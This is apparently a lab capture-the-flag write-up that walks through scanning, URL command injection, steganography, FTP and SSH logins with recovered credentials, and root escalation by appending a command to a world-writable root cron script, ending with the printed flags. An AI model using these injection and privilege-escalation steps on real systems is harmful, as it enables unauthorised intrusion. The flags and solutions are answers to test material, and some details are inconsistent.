# PhychoBreak 

## Links

- ip -> 10.10.74.154
- site -> http://10.10.74.154/
- http://10.10.74.154/sadistRoom/
- http://10.10.74.154/map.php
- http://10.10.74.154/SafeHeaven/
- http://10.10.74.154/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php
- http://10.10.74.154/abandonedRoom/680e89809965ec41e64dc7e447f175ab/
- Audio decoder -> https://morsecode.world/international/decoder/audio-decoder-adaptive.html
- kidman password decoder => https://www.cachesleuth.com/vanity.html
## Hint
1. 

```sh
Not Found

The requested URL was not found on this server.
Apache/2.4.18 (Ubuntu) Server at 10.10.74.154  Port 80

```
2. this in in the front end

```sh
 Sebastian sees a path through the darkness which leads to a room => /sadistRoom 
```
3. found some direcotories in http://10.10.74.154/map.php
```sh
Here is the map

1. Sadist Room

2. Locker Room

3. Safe Heaven

4. The Abandoned Room

```
4. Found directory in SafeHeaven called /keeper/

`1.There is a image there and I had to decode it via reverse image search`

5.
```sh
 There is something called "shell" on current page maybe that'll help you to get out of here !!!

 To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) 
```

6. Helpme.txt
```sh

From Joseph,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of 
this cell.

```
## Key
- Key to locker Room => 532219a04ab7a02b56faafbec1a4c1ea  -> it means i have to make a directory enum
- In Locker Room key to map =>Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv -> Grant_me_access_to_the_map_please
- Result or image search => St. Augustine Lighthouse
- Key for keeper => Here is your key : 48ee41458eb0b43bf82b986cecf3af01
- MD5 hashs => `680e89809965ec41e64dc7e447f175ab` `be8bc662d1e36575a52da40beba38275` 
## Notes

- after having the key to locker room in few seconds it giving me `Too Late Sebastian is dead !!!`
- It means the key is limited to time
- In this safeheaven directory if you see the frontend you can find 
	- ` I think I'm having a terrible nightmare. Search through me and find it ... `
	- It seems that there could be more hidden directories in this directory 

- http://10.10.74.154/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php
        - in this link there was no clue
        - so I tried to think about the frontend and get there two unsual thing 1. shell 2. pkill which is a linux cmd
        - and there is a directory call .php with the link
        - so i tried `/herecomeslara.php?shell=ls ..` actually i tried many cmds but its hited
	- after doing this i got two MD5 hashes 
	- the link it self was looking like a hash so i tried to change it withthe hash
	- it took me to a directory where i have  a zip file for me called `helpme.zipo`
	- `you_made_it.txt` this is the txt file
- Helpme.zip
	- into this we get a `helpme.txt`
	- and also a table.jpg
	- after doing stangnography we found a .jpg and .wav file
	- the .wav file seems to be and audio
	- the audio is kind of like bip bip , we can assume that we have to decode the audio
	- after docoding the audio we get `SHOWME`
	- now we have to do stegnography for the .jpg file to check if there is any clue hidden on that or not
	- for that we have to install a stegnography tool called `steghide`

## Commands
**Commands for port scan**

```sh
nmap -sS -sV -O 10.10.74.154 >> ports.txt

cat ports.txt       

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 11:04 EDT
Nmap scan report for 10.10.221.252
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
**Commands for Directory enumeration**
```sh
$ gobuster dir -u http://10.10.74.154/SafeHeaven/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

$ cat directory.txt
/imgs                 (Status: 301) [Size: 322] [--> http://10.10.74.154/SafeHeaven/imgs/]
/keeper               (Status: 301) [Size: 324] [--> http://10.10.74.154/SafeHeaven/keeper/]

```

```sh
$ file Table.jpg   
Table.jpg: Zip archive data, at least v2.0 to extract, compression method=deflate

```
- so we can assume this file is something to do with the zip
```sh
$ mv Table.jpg Table.zip 

$ unzip Table.zip 
Archive:  Table.zip
  inflating: Joseph_Oda.jpg          

  inflating: key.wav  
```
- Here we have done some stegnography
- Here we get a jpg file and a strange .wav file
- I havo to decode the audio file for that i have to download it from my computer

```sh
$ python3 -m http.server 80

```
**Stegnography**
```sh
$ steghide extract -sf Joseph_Oda.jpg 
Enter passphrase: 
wrote extracted data to "thankyou.txt".

```
- The passphrase was `SHOWME` from the .wav
```sh
$ cat thankyou.txt 

From joseph,

Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help 
Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. 
But for some reason there is my name listed on the note which I don't have a clue.

	   --------------------------------------------
        //						\\
	||	(NOTE) FTP Details			||
	||      ==================			||
	||						||
	||	USER : joseph				||
	||	PASSWORD : intotheterror445		||
	||						||
	\\						//
	   --------------------------------------------
	

Good luck, Be carefull !!!
                             
```
- we get a ftp account

**ftp login**
```sh
$ ftp 10.10.74.154 
Connected to 10.10.74.154.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.74.154]
Name (10.10.74.154:bc-here): joseph
331 Password required for joseph
Password: 
230 User joseph logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```
**ftp commands**
```sh
 
ftp> ls -al
229 Entering Extended Passive Mode (|||8238|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 0        0            4096 Aug 13  2020 .
drwxr-xr-x   2 0        0            4096 Aug 13  2020 ..
-rwxr-xr-x   1 joseph   joseph   11641688 Aug 13  2020 program
-rw-r--r--   1 joseph   joseph        974 Aug 13  2020 random.dic
226 Transfer complete
ftp> mget program
mget program [anpqy?]? 229 Entering Extended Passive Mode (|||25494|)
150 Opening BINARY mode data connection for program (11641688 bytes)
100% |***************************************************************************************************************************| 11368 KiB  148.55 KiB/s    00:00 ETA
226 Transfer complete
11641688 bytes received in 01:16 (148.21 KiB/s)

ftp> mget random.dic
mget random.dic [anpqy?]? 229 Entering Extended Passive Mode (|||3089|)
150 Opening BINARY mode data connection for random.dic (974 bytes)
100% |***************************************************************************************************************************|   974      249.25 KiB/s    00:00 ETA
226 Transfer complete
974 bytes received in 00:00 (5.06 KiB/s)

ftp> exit
	
```
- `mget <something>` this command will download things from ftp to our local machine
- we get two file `program  random.dic`
- random is something might me password and program is seeming tobe the user name for that we have to check it
- I found  a script in github which will hit every possible passwrod with the username

**script.py**
```py
import os
import subprocess
import sys

f = open("random.dic", "r")

keys = f.readlines()

for key in keys:
	key = str(key.replace("\n", ""))
	print (key)
	subprocess.run(["./program", key])
```
- I am here saving the password into a file called `password.txt`

```sh
kidman
kidman => Correct

Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33


$ grep "Correct" password.txt
kidman => Correct

```
- this could be our user
- Well Done !!! Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
- this could be the password but we have to decode this
- `KIDMANSPASSWORDISSOSTRANGE`

**SSH login**
```sh
$ sudo ssh kidman@10.10.74.154
kidman@10.10.74.154's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

171 packages can be updated.
121 updates are security updates.

```
```sh
kidman@evilwithin:~$ ls
user.txt
kidman@evilwithin:~$ cat user.txt 
4C72A4EF8E6FED69C72B4D58431C4254

```
**Finding in the crontab**
```sh
kidman@evilwithin:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py


kidman@evilwithin:~$ ls -la /var/.the_eye_of_ruvik.py 
-rwxr-xrw- 1 root root 300 Aug 14  2020 /var/.the_eye_of_ruvik.py

kidman@evilwithin:~$ touch /tmp/flag
kidman@evilwithin:~$ chmod 777 /tmp/flag 
kidman@evilwithin:~$ ls -la /tmp/flag 
-rwxrwxrwx 1 kidman kidman 0 Oct 12 04:48 /tmp/flag


kidman@evilwithin:~$ echo 'subprocess.call("cat /root/root.txt > /tmp/flag", shell=True)' >> /var/.the_eye_of_ruvik.py 
kidman@evilwithin:~$ cat /var/.the_eye_of_ruvik.py 
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)

subprocess.call("cat /root/root.txt > /tmp/flag")

```
- By this script the job will be done

```sh
kidman@evilwithin:~$ cat /tmp/flag
BA33BDF5B8A3BFC431322F7D13F3361E

```

## Root flag -> BA33BDF5B8A3BFC431322F7D13F3361E
